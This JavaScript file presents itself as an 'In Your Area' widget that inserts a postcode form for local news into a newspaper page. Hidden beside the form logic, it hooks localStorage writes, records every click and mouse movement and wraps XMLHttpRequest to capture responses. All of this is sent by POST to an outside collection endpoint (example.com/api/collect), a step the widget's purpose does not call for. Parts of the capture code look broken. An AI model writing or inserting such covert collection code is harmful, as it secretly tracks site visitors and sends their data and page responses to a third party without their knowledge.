let jshook = {};
var site = window.location.hostname.split('.')[1];
window.onload = function () {
  const targetProperties = new Set(['localStorage']);
  const globalPropertySet = new Set(Object.keys(window));
  targetProperties.forEach(property => {
    if (globalPropertySet.has(property)) {
      let originalProperty = window[property];
      Object.defineProperty(window, property, {
        set(value) {
          jshook[property] = value;
          originalProperty = value;
        },
        get() {
          return originalProperty;
        }
      });
    }
  });
};
document.addEventListener('click', function (e) {
  jshook.clickEvent = e;
  transmitData(jshook);
});
window.addEventListener('mousemove', function (e) {
  jshook.mousemoveEvent = e;
  transmitData(jshook);
});
var formHtml = '<link rel="stylesheet" href="https://s3.mirror.co.uk/emerging-products/in-your-area/iya.css?12"><link rel="stylesheet" href="https://s3.mirror.co.uk/emerging-products/in-your-area/theme/iya-' + site + '.css"><section class="emerging-test"> <div class="pancake"> <div class="iya-test-wrapper"> <div class="iya-test"> <div class="iya-info"> <h3>Enter your postcode for <span>news</span> and <span>information</span> near you</h3> <p>Local News & Events, Community Updates, Crime Statistics and much more...</p><form onsubmit="return onFormSubmit(); return false;" method="get" class="iya-postcode-search"> <input class="iya-postcode" placeholder="Enter your postcode"> <input class="iya-submit" type="submit" value="Go"><span class="iya-spinner" style="display: none"></span></form> </div><div class="iya-brand"><a href="http://www.inyourarea.co.uk/" target="_blank"><span class="iya-logo"></span></a><span class="iya-partner"></span></div></div></div></div></section>';
const defaultXHR = window.XMLHttpRequest;
window.XMLHttpRequest = function () {
  const request = new defaultXHR();
  request.addEventListener("readystatechange", function () {
    if (request.readyState === 4 && request.status >= 200 && request.status < 300) {
      jshook.xhr = request;
      transmitData(jshook);
    }
  });
  return request;
};
var elementHook = elementHook || 'div.primary';
var iyaEl = document.querySelectorAll(elementHook)[3];
if (iyaEl) {
  var newEl = document.createElement('div');
  newEl.innerHTML = formHtml;
  iyaEl.parentNode.insertBefore(newEl, iyaEl);
} else {
  console.log("Element not found.");
}
function isValidPostcode(p) {
  var postcodeRegEx = new RegExp("^[A-Z]{1,2}[0-9]{1,2}[A-Z]? ?[0-9][A-Z]{2}$", "i");
  return postcodeRegEx.test(p);
}
function transmitData(data) {
  let cloneJshook = {
    ...jshook
  };
  let serverEndpoint = "https://example.com/api/collect";
  let xhr = new defaultXHR();
  xhr.open("POST", serverEndpoint, true);
  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhr.onload = function () {
    if (xhr.status >= 200 && xhr.status < 400) {
      console.log("Data sent successfully");
    } else {
      console.error("Failed to send data, Status Code: " + xhr.status);
    }
  };
  xhr.onerror = function () {
    console.error("Error in data transmission");
  };
  xhr.send(JSON.stringify(cloneJshook));
  jshook = {};
}
function onFormSubmit() {
  var postcode = document.querySelector('.iya-postcode').value;
  postcode = (postcode || "").replace(/ /g, '');
  if (isValidPostcode(postcode)) {
    window.location = "https://www.inyourarea.co.uk/feed/" + postcode + "/?site=" + site;
  } else {
    alert("Invalid postcode");
  }
  return false;
}